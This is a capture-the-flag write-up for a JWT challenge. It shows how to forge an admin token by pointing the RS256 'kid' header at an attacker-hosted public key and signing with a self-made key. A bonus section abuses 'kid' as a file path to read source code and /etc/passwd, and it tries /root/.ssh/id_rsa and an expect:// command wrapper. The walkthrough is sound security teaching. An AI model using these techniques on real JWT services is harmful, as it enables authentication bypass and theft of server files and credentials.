# 15 - JWT 2

> I can admit I might not have figured out everything, but I think everything should be figured out now! I have however implemented a new header I found in RFC 7515.
> 
> http://rsxc.no:20015

---

When looking at the website we can see a `test`-user listed on the login page. We can also see that an `admin`-account exists. Let's try to log in using the `test`-user.

![](00.png "")

We have successfully logged in with the `test`-user:

![](01.png "")

Now we want to log in as the `admin`-user. Let's start by having a look at our cookies. We can see a `jwt`-cookie in there:

![](02.png "")

Let's look closer at this `JWT` using `jwt_tool.py`:

```bash
$ /opt/jwt_tool/jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6XC9cL2xvY2FsaG9zdFwvand0UlMyNTYua2V5LnB1YiJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.xl3jDlNK0trxkNjEQC5cNxWzZzPGUgGaLIiKHWv6hf2WvEzuuZbTaLSiZNDavs7V7SijOYH1IFQ8vjS_qd2-XQtf4Lc_WR7slsNDlpib4zK7MKXFbzoOm7XQF8bTafl_CBGYB2GU587ZdTsv5FoUPWfe6_XXiHTpQkVZKs-TGs8HQUtF0lDQ0f72XBMtioMoj7BM5cxfoQNYf72UOqucrYmpN_IOjb0ViOBTbU_mpDbrzAYStjqIpmze4mjogQfk5POY1cU3WWZYHv5fmRgBn_dR58IMsedrIdnAsw98J8XSxALFr1DwLC7EVf6rriP_r-3dJJFtEhhTSPQiVZUtrfAZexR7Gw0eg6cdOCICexmAdYw-9TGczzC26Y9R51G-NOHpTPvhw_qU2uD86PQZznN3GpemxvQyMW7c85zs9zGJlJ7TSRs72EJEdeCo08UQ12uuIzIJ2S-WMmoBPcEaibKS3ct-gOGP73ShRfIHF95MHjOcj5B4KHDRApOtL1bLE4p6Hri4m_W6J3U8GaxNctp-QTiSoxYA1dLYWWG9B9vvNhCH_ZKzTshuiC-Qhg3y-0IPPgVcxMUkE7LpbSOdSqIZP0_FJ--Nd5Ebat1I7iJKSGnTVeUILOUBYSuyaG1w5wp1ghqIFk5xwS6sMbIm_tCEJlMgWmWgFyerjh3QaI8

Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = "JWT"
[+] alg = "RS256"
[+] kid = "http://localhost/jwtRS256.key.pub"

Token payload values:
[+] username = "test"
```

We can now see the contents of our `JWT` and we can see that the token is signed with the `RS256` algorithm and that the `kid` field is present. The `kid`-field tells the server which public key to use to verify the signature of the token. It looks like the server accepts a `URI` to specify the location of the public key to use. We can see that `localhost` is used, but maybe we can trick the target server into using a public key that we create and host on our own server? If so, we can easily create a valid token by using the private key that we control to sign it.

Let's create our own private and a public key:

```bash
$ ssh-keygen -t rsa -b 4096 -m PEM -f jwtRS256.key
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in jwtRS256.key
Your public key has been saved in jwtRS256.key.pub
The key fingerprint is:
SHA256:4F5Q7L3Xen5mA7VcLfk5wf5pQ1o70Rcje/NKhA4lV5E hag@hag-desktop

$ openssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256.key.pub
writing RSA key
$ ll
total 16
-rw------- 1 hag hag 3243 Dec 26 03:38 jwtRS256.key
-rw-r--r-- 1 hag hag  800 Dec 26 03:38 jwtRS256.key.pub

$ cat jwtRS256.key.pub
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEArfzAYuKgU6IFHh9jdZGQ
P4OcyVDGO0n8IO4lHmL21j68YfJmbIo7/lyjnMYYfbIhw8CKxzchV3YOrnhaEQbO
ZNn2HHk7hlEDPUC6Eb+Y8zjq2YMCdvhK4UJzwpTgiWfSybF3oJkmQA565tfZdDMG
VWIqRhxZBBiS0BH+rT3UyO2R7cbx6CfKDaHQVZi+cfijlredt39jYNaqr+yfrz7m
Ae2Znxa/3UewDGQ78F3FaoHqQjaO5pL+EfvcK8u6UYKtL3czirDdfixnyn22wxa5
lwTuxMkNo2HXk0UXJeVJkJTQWr8W2cQoR5etyRXRVY0ymyM3jsJULqj3hE09ZCL8
RlE3I1C1QNY83qx/of4hPFioDxXL+Ez9TrlJhKhBK00ElJHf6vjLrIbed0Ee3bze
TjOjIbL3H0eaiqIdI8Gyo17anRJMvGi59zt96tcJa8Cjap+FJ2BjIc6bLmOUpemj
Vm387vzdBtCLCrKrfU6jU7AX8sNLhy10pUOWyiLzIK6+wD9OGJJLNR4Z7DR5P79s
kHLua9dxR/K0xLFf2iOnAySHljbK/zuxyp2NBMfDA4XqbxIGknlUMJi1LSe4FbK4
+z6GYPJdXmrgc/YYgNXLX3vG7GF8yUFiF7q5K4ghVj1UhmR0lwzb0U34IFbfHc7h
yyjW52t2PIE8iXCaRh9vUn8CAwEAAQ==
-----END PUBLIC KEY-----
```

Now we put the public key on a server that we control and make it available to the world. Then we use `jwt_tool.py` to tamper with the original token and sign it with our newly created private key:

```bash
$ /opt/jwt_tool/jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6XC9cL2xvY2FsaG9zdFwvand0UlMyNTYua2V5LnB1YiJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.xl3jDlNK0trxkNjEQC5cNxWzZzPGUgGaLIiKHWv6hf2WvEzuuZbTaLSiZNDavs7V7SijOYH1IFQ8vjS_qd2-XQtf4Lc_WR7slsNDlpib4zK7MKXFbzoOm7XQF8bTafl_CBGYB2GU587ZdTsv5FoUPWfe6_XXiHTpQkVZKs-TGs8HQUtF0lDQ0f72XBMtioMoj7BM5cxfoQNYf72UOqucrYmpN_IOjb0ViOBTbU_mpDbrzAYStjqIpmze4mjogQfk5POY1cU3WWZYHv5fmRgBn_dR58IMsedrIdnAsw98J8XSxALFr1DwLC7EVf6rriP_r-3dJJFtEhhTSPQiVZUtrfAZexR7Gw0eg6cdOCICexmAdYw-9TGczzC26Y9R51G-NOHpTPvhw_qU2uD86PQZznN3GpemxvQyMW7c85zs9zGJlJ7TSRs72EJEdeCo08UQ12uuIzIJ2S-WMmoBPcEaibKS3ct-gOGP73ShRfIHF95MHjOcj5B4KHDRApOtL1bLE4p6Hri4m_W6J3U8GaxNctp-QTiSoxYA1dLYWWG9B9vvNhCH_ZKzTshuiC-Qhg3y-0IPPgVcxMUkE7LpbSOdSqIZP0_FJ--Nd5Ebat1I7iJKSGnTVeUILOUBYSuyaG1w5wp1ghqIFk5xwS6sMbIm_tCEJlMgWmWgFyerjh3QaI8 -T -S rs256 -pr jwtRS256.key

Original JWT:

====================================================================
This option allows you to tamper with the header, contents and
signature of the JWT.
====================================================================

Token header values:
[1] typ = "JWT"
[2] alg = "RS256"
[3] kid = "http://localhost/jwtRS256.key.pub"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 3

Current value of kid is: http://localhost/jwtRS256.key.pub
Please enter new value and hit ENTER
> http://167.99.220.97/test.pub
[1] typ = "JWT"
[2] alg = "RS256"
[3] kid = "http://167.99.220.97/test.pub"
[4] *ADD A VALUE*
[5] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] username = "test"
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of username is: test
Please enter new value and hit ENTER
> admin
[1] username = "admin"
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
jwttool_9c3c1b6b282f99d533da112190111af0 - Tampered token - RSA Signing:
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xNjcuOTkuMjIwLjk3L3Rlc3QucHViIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.kNPGxivW4nbWcLbX1z9HNN8brAGGt9lezS3eLieCIJgpsUY5-vkmYsL-QSbRZ09MA7sYdH7IOyFHVevlv4ShkUkF-Ckye7pf9KESNb1YrLDWP_NM26SE15FWJfQuqJ265IiiB4n4XyVSMmXemuCg4IVE3pbdyJltOyaO_M8a7Y1Nuroyk33ZWNlpuw-sNPBKfHa_Hi1maAWgqjdZkUs07kJBj2wW3tvC_zXYwF7mIj6QUrSDdITUUZz3csBSVet-s1j2J1PaIKV_BNZ2YJ06Awyv9mnBhOLDNFNOmoofCO_nZkgmjQZQIRaERAJ4e8DyNIhtcZqR2kMTbgV5a-YGcRGog_WZLDapgi_-Pw1mnCPmwib5YhpgY9yf9ubacjRkoF9VQUJZDBZeGMuGoi-fNHghbzkfT_0LnMIySM0GwzYwD4bEz3uBdiT0XnBtXVSsweLf_JuZhz_fbVb8IzCvPx0jSyPKjq0jQl55KyEOtdWnNdxIKVuu8BtrQcP2Amfg6_AUJTnPkbtKexixpBZC-Wuf52dG_j80VZR8hiWoYDfUs7PXPtUw2dj7TF2WLaOi2mxQD6fZCOW5VUs0chTgVIsTBWIlH5J13y27pGdYt10H4mZ7gDG3FiCM16At-zpBVhoMaTcYZgizeeU0YgUGQszzZoA1fUnQdYiteR489TQ
```

We can see that we have changed the `kid`-field to point to our newly created public key, changed the `username`-field to `admin` and created a new signed `JWT`.

Let's copy and paste our newly created token into the `jwt`-cookie and reload `http://rsxc.no:20015/portal.php`:

![](03.png "")

We are now logged in as the `admin`-user and can see the flag!

## Solution

The flag is: `RSXC{Don't_let_others_decide_where_your_keys_are_located}`

---

## Bonus LFI Vulnerability!

During the exploitation of the `JWT` I noticed that this web application has a local file inclusion vulnerability as well.

We can basically use the `kid`-field to read arbitrary files on the server.


### `kid = portal.php` (`view-source:http://rsxc.no:20015/portal.php`)

We can easily see the flag here as well.

```php

<br />
<b>Notice</b>:  <?php
include_once __DIR__ . "/includes/authorization_handler.php";
$username = (new AuthorizationHandler())::getUsername();

$flag = "RSXC{Don't_let_others_decide_where_your_keys_are_located}"

?>
<!DOCTYPE html>
<html lang="en" class="h-100">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <link href="/assets/css/bootstrap.min.css" rel="stylesheet">
    <title>Tracker</title>
    <style>
    .container {
      width: auto;
      max-width: 680px;
      padding: 0 15px;
      }
    </style>
</head>

<body class="d-flex flex-column h-100">

<!-- Begin page content -->
<main class="flex-shrink-0">
  <div class="container">
    <h1>My personal notes</h1>
    <p><b>I fixed the last issue I had, and I have now decided to use 'KID' for more ease of use.</b></p>
    <?php
    if($username == "admin"){
      ?>
      <p>The flag is <?=$flag ?></p>
      <?php
    } else {
     ?>
    <p>You currently have no notes in <b>/var/www/html/includes/jwt.php</b> on line <b>28</b><br />
<br />
<b>Warning</b>:  openssl_verify(): supplied key param cannot be coerced into a public key in <b>/var/www/html/vendor/firebase/php-jwt/src/JWT.php</b> on line <b>272</b><br />
<br />
<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /var/www/html/includes/jwt.php:28) in <b>/var/www/html/includes/helper.php</b> on line <b>4</b><br />

```

### `kid = /etc/passwd`:
```
Notice:
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin

in /var/www/html/includes/jwt.php on line 28

Warning: openssl_verify(): supplied key param cannot be coerced into a public key in /var/www/html/vendor/firebase/php-jwt/src/JWT.php on line 272

Warning: Cannot modify header information - headers already sent by (output started at /var/www/html/includes/jwt.php:28) in /var/www/html/includes/helper.php on line 4
```


### `kid = "/root/.ssh/id_rsa"`

```
Warning: file_get_contents(/root/.ssh/id_rsa): failed to open stream: Permission denied in /var/www/html/includes/jwt.php on line 28
```

### `kid = "expect://ls"`

Warning: file_get_contents(): Unable to find the wrapper "expect" - did you forget to enable it when you configured PHP? in /var/www/html/includes/jwt.php on line 28


## LFI to RCE

There might be a way to leverage the LFI to gain RCE, but that's way out of the scope of this challenge.